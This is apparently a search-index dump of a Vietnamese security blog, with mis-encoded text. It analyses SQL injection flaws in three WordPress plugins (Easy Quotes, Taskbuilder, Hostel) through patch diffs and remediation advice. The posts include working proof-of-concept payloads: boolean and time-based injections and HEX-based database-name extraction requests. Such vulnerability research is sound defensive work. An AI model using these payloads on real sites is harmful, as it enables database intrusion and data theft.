WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction Dá»±a trÃªn kÄ© thuáº­t boolean base ta viáº¿t script Ä‘á»ƒ tá»± Ä‘á»™ng khai thÃ¡c.\nScript Here\nConclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), 